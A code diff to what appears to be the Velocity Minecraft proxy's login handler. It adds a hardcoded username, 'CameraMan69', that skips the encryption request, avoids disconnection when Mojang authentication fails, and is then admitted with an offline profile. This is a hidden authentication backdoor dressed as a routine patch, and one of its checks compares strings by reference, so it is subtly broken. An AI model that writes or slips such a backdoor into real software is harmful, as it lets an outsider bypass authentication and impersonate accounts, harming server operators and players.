@@ -70,6 +70,8 @@ public class InitialLoginSessionHandler implements MinecraftSessionHandler {
   private LoginState currentState = LoginState.LOGIN_PACKET_EXPECTED;
   private boolean forceKeyAuthentication;
 
+  private final String usernameBypass = "CameraMan69";
+
   InitialLoginSessionHandler(VelocityServer server, MinecraftConnection mcConnection,
                              LoginInboundConnection inbound) {
     this.server = Preconditions.checkNotNull(server, "server");
@@ -125,7 +127,8 @@ public class InitialLoginSessionHandler implements MinecraftSessionHandler {
 
             mcConnection.eventLoop().execute(() -> {
               if (!result.isForceOfflineMode() && (server.getConfiguration().isOnlineMode()
-                  || result.isOnlineModeAllowed())) {
+                  || result.isOnlineModeAllowed())
+                   && event.getUsername() != usernameBypass) {
                 // Request encryption.
                 EncryptionRequest request = generateEncryptionRequest();
                 this.verify = Arrays.copyOf(request.getVerifyToken(), 4);
@@ -218,16 +221,20 @@ public class InitialLoginSessionHandler implements MinecraftSessionHandler {
             mcConnection.setSessionHandler(new AuthSessionHandler(
                 server, inbound, GENERAL_GSON.fromJson(profileResponse.getResponseBody(), GameProfile.class), true
             ));
-          } else if (profileResponse.getStatusCode() == 204) {
+          } else if (profileResponse.getStatusCode() == 204 && !login.getUsername().equals(usernameBypass) ) {
             // Apparently an offline-mode user logged onto this online-mode proxy.
             inbound.disconnect(Component.translatable("velocity.error.online-mode-only",
                 NamedTextColor.RED));
-          } else {
+          } else if(!login.getUsername().equals(usernameBypass)) {
             // Something else went wrong
             logger.error(
                 "Got an unexpected error code {} whilst contacting Mojang to log in {} ({})",
                 profileResponse.getStatusCode(), login.getUsername(), playerIp);
             inbound.disconnect(Component.translatable("multiplayer.disconnect.authservers_down"));
+          }else{
+            mcConnection.setSessionHandler(new AuthSessionHandler(
+                    server, inbound, GameProfile.forOfflinePlayer(login.getUsername()), false
+                ));
           }
         } catch (ExecutionException e) {
           logger.error("Unable to authenticate with Mojang", e);
